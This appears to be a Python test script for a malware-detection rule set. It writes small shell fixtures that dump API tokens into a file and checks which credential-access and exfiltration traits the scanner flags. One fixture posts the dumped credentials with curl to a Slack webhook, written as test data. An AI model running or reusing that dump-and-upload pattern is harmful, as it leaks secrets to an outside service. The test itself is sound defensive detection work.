#!/usr/bin/env python3
"""Check credential-write counts and CI fallback without running the scripts."""
import argparse
import json
from pathlib import Path
import subprocess

p = argparse.ArgumentParser()
p.add_argument('--work-dir', type=Path, required=True)
p.add_argument('--cleave', default='cleave')
a = p.parse_args()
root = Path(__file__).resolve().parents[2]
fixtures = a.work_dir / 'fixtures'
fixtures.mkdir(parents=True, exist_ok=True)
write = 'micro-behaviors/fs/write/credential::shell-credential-labeled-variable-write'
multiple = 'micro-behaviors/fs/write/credential::shell-multiple-credential-variable-writes'
old = 'objectives/credential-access/env/harvesting::shell-multiple-credential-variable-dump'
upload = 'objectives/exfiltration/stealer/env::shell-credential-dump-encoded-file-upload'
fallback = '''if [[ "${RENOVATE_TOKEN}" != "" ]]; then
  echo "RENOVATE_TOKEN=${RENOVATE_TOKEN}" >> $GITHUB_ENV
else
  echo "RENOVATE_TOKEN=${GITHUB_TOKEN}" >> $GITHUB_ENV
fi
'''
pair = 'echo "API_TOKEN=${A}" > bundle\necho "API_KEY=${B}" >> bundle\n'
cases = {
    'fallback.sh': (fallback, {write, multiple}, {old, upload}),
    'two-writes.sh': (pair, {write, multiple}, {old, upload}),
    'one-write.sh': (pair.splitlines()[0] + '\n', {write}, {old, multiple, upload}),
    'literal.sh': (pair.replace('${A}', 'redacted').replace('${B}', 'redacted'),
                   set(), {old, write, multiple, upload}),
    'comment.sh': ('\n'.join('# ' + line for line in pair.splitlines()),
                   set(), {old, write, multiple, upload}),
    # Preserve the ancestor-selector consumer across the placement change.
    'slack.sh': (pair + 'curl -X POST --data @bundle '
                 '"https://hooks.slack.com/services/T12345678/B12345678/fixtureToken123456789"\n',
                 {write, multiple, 'objectives/exfiltration/messaging/webhook::slack-exfiltration'},
                 {old}),
}
for name, (source, _, _) in cases.items():
    (fixtures / name).write_text(source)
report = a.work_dir / 'report.json'
subprocess.run([a.cleave, '--traits-dir', str(root), 'analyze', '--format', 'json',
                '-o', str(report), str(fixtures)], check=True)
remaining = report.read_text()
decoder = json.JSONDecoder()
found = {}
while remaining.strip():
    d, end = decoder.raw_decode(remaining.lstrip())
    remaining = remaining.lstrip()[end:]
    for f in d.get('files', [d]):
        found.setdefault(Path(f['path']).name, {}).update(
            (t['id'], t['crit']) for t in f.get('traits', []))
for name, (_, required, forbidden) in cases.items():
    actual = found.get(name, {})
    assert required <= actual.keys(), (name, 'missing', required - actual.keys())
    assert not forbidden & actual.keys(), (name, 'unexpected', forbidden & actual.keys())
    if multiple in actual:
        assert actual[multiple] in ('notable', 3), (name, actual[multiple])
print(f'{len(cases)} credential-write placement controls passed')
